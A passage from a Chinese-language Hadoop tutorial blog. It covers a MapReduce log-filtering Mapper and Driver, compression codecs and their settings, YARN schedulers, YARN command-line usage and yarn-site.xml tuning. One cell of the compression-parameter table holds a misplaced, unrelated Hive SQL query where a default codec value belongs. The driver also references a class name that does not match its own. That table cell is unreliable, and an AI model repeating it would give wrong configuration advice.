/ HTTP/1.1"</span> 200 20 <span class="string">"-"</span> <span class="string">"DNSPod-Monitor/1.0"</span></span><br><span class="line">101.226.68.137 - - [18/Sep/2013:06:49:45 +0000] <span class="string">"HEAD / HTTP/1.1"</span> 200 20 <span class="string">"-"</span> <span class="string">"DNSPod-Monitor/1.0"</span></span><br></pre></td></tr></table></figure><p>需要在Map阶段对输入的数据根据规则进行过滤清洗，开始编写代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//编写WebLogMapper类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebLogMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">LongWritable</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">NullWritable</span>&gt;</span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(LongWritable key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1 获取1行数据</span></span><br><span class="line">    String line = value.toString();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2 解析日志</span></span><br><span class="line">    <span class="keyword">boolean</span> result = parseLog(line,context);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3 日志不合法退出</span></span><br><span class="line">    <span class="keyword">if</span> (!result) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4 日志合法就直接写出</span></span><br><span class="line">    context.write(value, NullWritable.get());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2 封装解析日志的方法</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">parseLog</span><span class="params">(String line, Context context)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 截取</span></span><br><span class="line">    String[] fields = line.split(<span class="string">" "</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2 日志长度大于11的为合法</span></span><br><span class="line">    <span class="keyword">if</span> (fields.length &gt; <span class="number">11</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//编写WebLogDriver类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebLogDriver</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入输出路径需要根据自己电脑上实际的输入输出路径设置</span></span><br><span class="line">        args = <span class="keyword">new</span> String[] &#123; <span class="string">"D:/input/inputlog"</span>, <span class="string">"D:/output1"</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 获取job信息</span></span><br><span class="line">    Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">    Job job = Job.getInstance(conf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2 加载jar包</span></span><br><span class="line">    job.setJarByClass(LogDriver<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3 关联map</span></span><br><span class="line">    job.setMapperClass(WebLogMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4 设置最终输出类型</span></span><br><span class="line">    job.setOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    job.setOutputValueClass(NullWritable<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置reducetask个数为0</span></span><br><span class="line">    job.setNumReduceTasks(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5 设置输入和输出路径</span></span><br><span class="line">    FileInputFormat.setInputPaths(job, <span class="keyword">new</span> Path(args[<span class="number">0</span>]));</span><br><span class="line">    FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(args[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6 提交</span></span><br><span class="line">         <span class="keyword">boolean</span> b = job.waitForCompletion(<span class="keyword">true</span>);</span><br><span class="line">         System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-8-MapReduce开发总结">3.8 MapReduce开发总结</h3><ul><li><p>输入数据接口：InputFormat</p><ul><li>默认使用的实现类是：TextInputFormat</li><li>TextInputFormat的功能逻辑是：一次读一行文本，然后将该行的起始偏移量作为key，行内容作为value返回</li><li>CombineTextInputFormat可以把多个小文件合并成一个切片处理，提高处理效率。</li></ul></li><li><p>逻辑处理接口：Mapper </p><p>用户根据业务需求实现其中三个方法：map()   setup()   cleanup ()</p></li><li><p>Partitioner分区</p><ul><li>有默认实现 HashPartitioner，逻辑是根据key的哈希值和numReduces来返回一个分区号；key.hashCode()&amp;Integer.MAXVALUE % numReduces</li><li>如果业务上有特别的需求，可以自定义分区</li></ul></li><li><p>Comparable排序</p><ul><li>当我们用自定义的对象作为key来输出时，就必须要实现WritableComparable接口，重写其中的compareTo()方法</li><li>部分排序：对最终输出的每一个文件进行内部排序</li><li>全排序：对所有数据进行排序，通常只有一个Reduce</li><li>二次排序：排序的条件有两个</li></ul></li><li><p>Combiner合并</p><p>Combiner合并可以提高程序执行效率，减少IO传输。但是使用时必须不能影响原有的业务处理结果</p></li><li><p>逻辑处理接口：Reducer</p><p>用户根据业务需求实现其中三个方法：reduce()   setup()   cleanup () </p></li><li><p>输出数据接口：OutputFormat</p><ul><li>默认实现类是TextOutputFormat，功能逻辑是：将每一个KV对，向目标文本文件输出一行</li><li>用户还可以自定义OutputFormat</li></ul></li></ul><h2 id="4、Hadoop数据压缩">4、Hadoop数据压缩</h2><h3 id="4-1-概述">4.1 概述</h3><p><strong>压缩的好处和坏处</strong></p><ul><li>压缩的优点：以减少磁盘IO、减少磁盘存储空间</li><li>压缩的缺点：增加CPU开销</li></ul><p><strong>压缩原则</strong></p><ul><li>运算密集型的Job，少用压缩</li><li>IO密集型的Job，多用压缩</li></ul><h3 id="4-2-MR支持的压缩编码">4.2 MR支持的压缩编码</h3><table><thead><tr><th>压缩格式</th><th>Hadoop自带？</th><th>算法</th><th>文件扩展名</th><th>是否可切片</th><th>换成压缩格式后，原来的程序是否需要修改</th></tr></thead><tbody><tr><td>DEFLATE</td><td>是，直接使用</td><td>DEFLATE</td><td>.deflate</td><td>否</td><td>和文本处理一样，不需要修改</td></tr><tr><td>Gzip</td><td>是，直接使用</td><td>DEFLATE</td><td>.gz</td><td>否</td><td>和文本处理一样，不需要修改</td></tr><tr><td>bzip2</td><td>是，直接使用</td><td>bzip2</td><td>.bz2</td><td><strong>是</strong></td><td>和文本处理一样，不需要修改</td></tr><tr><td>LZO</td><td>否，需要安装</td><td>LZO</td><td>.lzo</td><td><strong>是</strong></td><td>需要建索引，还需要指定输入格式</td></tr><tr><td>Snappy</td><td>是，直接使用</td><td>Snappy</td><td>.snappy</td><td>否</td><td>和文本处理一样，不需要修改</td></tr></tbody></table><p>压缩性能的比较</p><table><thead><tr><th>压缩算法</th><th>原始文件大小</th><th>压缩文件大小</th><th>压缩速度</th><th>解压速度</th></tr></thead><tbody><tr><td>gzip</td><td>8.3GB</td><td>1.8GB</td><td>17.5MB/s</td><td>58MB/s</td></tr><tr><td>bzip2</td><td>8.3GB</td><td>1.1GB</td><td>2.4MB/s</td><td>9.5MB/s</td></tr><tr><td>LZO</td><td>8.3GB</td><td>2.9GB</td><td>49.3MB/s</td><td>74.6MB/s</td></tr></tbody></table><h3 id="4-3-压缩方式选择">4.3 压缩方式选择</h3><p>压缩方式选择时重点考虑：压缩/解压缩速度、压缩率（压缩后存储大小）、压缩后是否可以支持切片</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330928.png" alt></p><h3 id="4-4-压缩参数配置">4.4 压缩参数配置</h3><p>为了支持多种压缩/解压缩算法，Hadoop引入了编码/解码器</p><table><thead><tr><th><strong>压缩格式</strong></th><th><strong>对应的编码/解码器</strong></th></tr></thead><tbody><tr><td>DEFLATE</td><td>org.apache.hadoop.io.compress.DefaultCodec</td></tr><tr><td>gzip</td><td>org.apache.hadoop.io.compress.GzipCodec</td></tr><tr><td>bzip2</td><td>org.apache.hadoop.io.compress.BZip2Codec</td></tr><tr><td>LZO</td><td>com.hadoop.compression.lzo.LzopCodec</td></tr><tr><td>Snappy</td><td>org.apache.hadoop.io.compress.SnappyCodec</td></tr></tbody></table><p>要在Hadoop中启用压缩，可以配置如下参数</p><table><thead><tr><th>参数</th><th>默认值</th><th>阶段</th><th>建议</th></tr></thead><tbody><tr><td>io.compression.codecs （在core-site.xml中配置）</td><td>无，这个需要在命令行输入hadoop checknative查看</td><td>输入压缩</td><td>Hadoop使用文件扩展名判断是否支持某种编解码器</td></tr><tr><td>mapreduce.map.output.compress（在mapred-site.xml中配置）</td><td>false</td><td>mapper输出</td><td>这个参数设为true启用压缩</td></tr><tr><td>mapreduce.map.output.compress.codec（在mapred-site.xml中配置）</td><td>org.apache.hadoop.io.compress.DefaultCodec</td><td>mapper输出</td><td>企业多使用LZO或Snappy编解码器在此阶段压缩数据</td></tr><tr><td>mapreduce.output.fileoutputformat.compress（在mapred-site.xml中配置）</td><td>false</td><td>reducer输出</td><td>这个参数设为true启用压缩</td></tr><tr><td>mapreduce.output.fileoutputformat.compress.codec（在mapred-site.xml中配置）</td><td>xxxxxxxxxx drop table if exists promotion_info;create table promotion_info(    promotion_id string comment ‘优惠活动id’,    brand        string comment ‘优惠品牌’,    start_date   string comment ‘优惠活动开始日期’,    end_date     string comment ‘优惠活动结束日期’) comment ‘各品牌活动周期表’;​select    brand,    sum(datediff(end_date,start_date)+1) promotion_day_countfrom(    select        brand,        max_end_date,        if(max_end_date is null or start_date&gt;max_end_date,start_date,date_add(max_end_date,1)) start_date,        end_date    from    (        select            brand,            start_date,            end_date,            max(end_date) over(partition by brand order by start_date rows between unbounded preceding and 1 preceding) max_end_date        from promotion_info    )t1)t2where end_date&gt;start_dategroup by brand;​sql</td><td>reducer输出</td><td>使用标准工具或者编解码器，如gzip和bzip2</td></tr></tbody></table><h3 id="4-5-压缩实操案例">4.5 压缩实操案例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在driver开启mapper压缩，其他都不需要变，即中间文件压缩了，不影响输出</span></span><br><span class="line">Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line"><span class="comment">// 开启map端输出压缩</span></span><br><span class="line">conf.setBoolean(<span class="string">"mapreduce.map.output.compress"</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 设置map端输出压缩方式</span></span><br><span class="line">conf.setClass(<span class="string">"mapreduce.map.output.compress.codec"</span>, BZip2Codec<span class="class">.<span class="keyword">class</span>,<span class="title">CompressionCodec</span>.<span class="title">class</span>)</span>;</span><br><span class="line">Job job = Job.getInstance(conf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置reducer的压缩，影响最终输出结果</span></span><br><span class="line"><span class="comment">// 设置reduce端输出压缩开启</span></span><br><span class="line">FileOutputFormat.setCompressOutput(job, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 设置压缩的方式</span></span><br><span class="line">FileOutputFormat.setOutputCompressorClass(job, BZip2Codec<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure><h1>四、Yarn</h1><h2 id="1、Yarn资源调度器">1、Yarn资源调度器</h2><blockquote><p>Yarn是一个资源调度平台，负责为运算程序提供服务器运算资源，相当于一个分布式的操作系统平台，而MapReduce等运算程序则相当于运行于操作系统之上的应用程序</p></blockquote><h3 id="1-1-Yarn基础架构">1.1 Yarn基础架构</h3><p>YARN主要由ResourceManager、NodeManager、ApplicationMaster和Container等组件构成</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330929.png" alt></p><h3 id="1-2-Yarn工作机制">1.2 Yarn工作机制</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330930.png" alt></p><h3 id="1-3-Yarn调度器和调度算法">1.3 Yarn调度器和调度算法</h3><blockquote><p>目前，Hadoop作业调度器主要有三种：FIFO、容量（Capacity Scheduler）和公平（Fair Scheduler）。Apache Hadoop3.1.3默认的资源调度器是Capacity Scheduler(具体设置详见：yarn-default.xml文件)，CDH框架默认调度器是Fair Scheduler</p></blockquote><p><strong>先进先出调度器（FIFO）</strong></p><p>FIFO调度器（First In First Out）：单队列，根据提交作业的先后顺序，先来先服务</p><p><strong>容量调度器（Capacity Scheduler）</strong></p><blockquote><p>Capacity Scheduler 是 Yahoo 开发的多用户调度器</p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202401251330931.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251330932.png" alt></p><p><strong>公平调度器（Fair Scheduler）</strong></p><blockquote><p>Fair Schedulere 是 Facebook 开发的多用户调度器</p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202401251330933.png" alt></p><p>公平调度器设计目标是：在时间尺度上，所有作业获得公平的资源。某一<br>时刻一个作业应获资源和实际获取资源的差距叫&quot;缺额&quot;。调度器会优先为缺额大的作业分配资源</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330934.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251330935.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251330936.png" alt></p><p>DRF策略：DRF（Dominant Resource Fairness），我们之前说的资源，都是单一标准，例如只考虑内存（也是Yarn默认的情况）。但是很多时候我们资源有很多种，例如内存，CPU，网络带宽等，这样我们很难衡量两个应用应该分配的资源比例。</p><h3 id="1-4-Yarn-常用命令">1.4 Yarn 常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yarn状态的查询，除了可以在hadoop103:8088页面查看外，还可以通过命令操作</span></span><br><span class="line"><span class="comment"># 先运行</span></span><br><span class="line">myhadoop.sh start</span><br><span class="line">hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br><span class="line"></span><br><span class="line"><span class="comment"># =======================yarn application查看任务==============</span></span><br><span class="line"><span class="comment"># 列出所有Application</span></span><br><span class="line">yarn application -list</span><br><span class="line"><span class="comment"># 根据Application状态过滤：yarn application -list -appStates （所有状态：ALL、NEW、NEW_SAVING、SUBMITTED、ACCEPTED、RUNNING、FINISHED、FAILED、KILLED）</span></span><br><span class="line">yarn application -list -appStates FINISHED</span><br><span class="line"><span class="comment"># Kill掉Application</span></span><br><span class="line">yarn application -<span class="built_in">kill</span> application_1612577921195_0001</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================yarn logs查看日志======================</span></span><br><span class="line"><span class="comment"># 查询Application日志：yarn logs -applicationId &lt;ApplicationId&gt;</span></span><br><span class="line">yarn logs -applicationId application_1612577921195_0001</span><br><span class="line"><span class="comment"># 查询Container日志：yarn logs -applicationId &lt;ApplicationId&gt; -containerId &lt;ContainerId&gt;</span></span><br><span class="line">yarn logs -applicationId application_1612577921195_0001 -containerId container_1612577921195_0001_01_000001</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================yarn applicationattempt查看尝试运行的任务=====</span></span><br><span class="line"><span class="comment"># 列出所有Application尝试的列表：yarn applicationattempt -list &lt;ApplicationId&gt;</span></span><br><span class="line">yarn applicationattempt -list application_1612577921195_0001</span><br><span class="line"><span class="comment"># 打印ApplicationAttemp状态：yarn applicationattempt -status &lt;ApplicationAttemptId&gt;</span></span><br><span class="line">yarn applicationattempt -status appattempt_1612577921195_0001_000001</span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================yarn container查看容器===============</span></span><br><span class="line"><span class="comment"># 列出所有Container：yarn container -list &lt;ApplicationAttemptId&gt;</span></span><br><span class="line">yarn container -list appattempt_1612577921195_0001_000001</span><br><span class="line"><span class="comment"># 打印Container状态：  yarn container -status &lt;ContainerId&gt;</span></span><br><span class="line"><span class="comment"># 注：只有在任务跑的途中才能看到container的状态</span></span><br><span class="line">yarn container -status container_1612577921195_0001_01_000001</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================yarn rmadmin更新配置==============</span></span><br><span class="line"><span class="comment"># 加载队列配置：yarn rmadmin -refreshQueues</span></span><br><span class="line">yarn rmadmin -refreshQueues</span><br><span class="line"></span><br><span class="line"><span class="comment"># =======================yarn queue查看队列====================</span></span><br><span class="line"><span class="comment"># 打印队列信息：yarn queue -status &lt;QueueName&gt;</span></span><br><span class="line">yarn queue -status default</span><br></pre></td></tr></table></figure><h3 id="1-5-Yarn-生产环境核心参数">1.5 Yarn 生产环境核心参数</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330937.png" alt></p><h2 id="2、Yarn-案例实操">2、Yarn 案例实操</h2><blockquote><p>注：调整下列参数之前尽量拍摄 Linux 快照，否则后续的案例，还需要重写准备集群</p></blockquote><h3 id="2-1-Yarn生产环境核心参数配置案例">2.1 Yarn生产环境核心参数配置案例</h3><p>需求：从1G数据中，统计每个单词出现次数。服务器3台，每台配置4G内存，4核CPU，4线程。需求分析：1G / 128m = 8个MapTask；1个ReduceTask；1个mrAppMaster，平均每个节点运行10个 / 3台 ≈ 3个任务（4 3 3），所以要改<code>yarn-site.xml</code>配置参数如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 选择调度器，默认容量 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The class to use as the resource scheduler.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.class<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.yarn.server.resourcemanager.scheduler.capacity.CapacityScheduler<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ResourceManager处理调度器请求的线程数量,默认50；如果提交的任务数大于50，可以增加该值，但是不能超过3台 * 4线程 = 12线程（去除其他应用程序实际不能超过8） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Number of threads to handle scheduler interface.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.client.thread-count<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>8<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 是否让yarn自动检测硬件进行配置，默认是false，如果该节点有很多其他应用程序，建议手动配置。如果该节点没有其他应用程序，可以采用自动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Enable auto-detection of node capabilities such as</span><br><span class="line">  memory and CPU.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.detect-hardware-capabilities<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 是否将虚拟核数当作CPU核数，默认是false，采用物理CPU核数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Flag to determine if logical processors(such as</span><br><span class="line">  hyperthreads) should be counted as cores. Only applicable on Linux</span><br><span class="line">  when yarn.nodemanager.resource.cpu-vcores is set to -1 and</span><br><span class="line">  yarn.nodemanager.resource.detect-hardware-capabilities is true.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.count-logical-processors-as-cores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 虚拟核数和物理核数乘数，默认是1.0 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Multiplier to determine how to convert phyiscal cores to</span><br><span class="line">  vcores. This value is used if yarn.nodemanager.resource.cpu-vcores</span><br><span class="line">  is set to -1(which implies auto-calculate vcores) and</span><br><span class="line">  yarn.nodemanager.resource.detect-hardware-capabilities is set to true. The  number of vcores will be calculated as  number of CPUs * multiplier.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.pcores-vcores-multiplier<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- NodeManager使用内存数，默认8G，修改为4G内存 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Amount of physical memory, in MB, that can be allocated </span><br><span class="line">  for containers. If set to -1 and</span><br><span class="line">  yarn.nodemanager.resource.detect-hardware-capabilities is true, it is</span><br><span class="line">  automatically calculated(in case of Windows and Linux).</span><br><span class="line">  In other cases, the default is 8192MB.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.memory-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>4096<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- nodemanager的CPU核数，不按照硬件环境自动设定时默认是8个，修改为4个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Number of vcores that can be allocated</span><br><span class="line">  for containers. This is used by the RM scheduler when allocating</span><br><span class="line">  resources for containers. This is not used to limit the number of</span><br><span class="line">  CPUs used by YARN containers. If it is set to -1 and</span><br><span class="line">  yarn.nodemanager.resource.detect-hardware-capabilities is true, it is</span><br><span class="line">  automatically determined from the hardware in case of Windows and Linux.</span><br><span class="line">  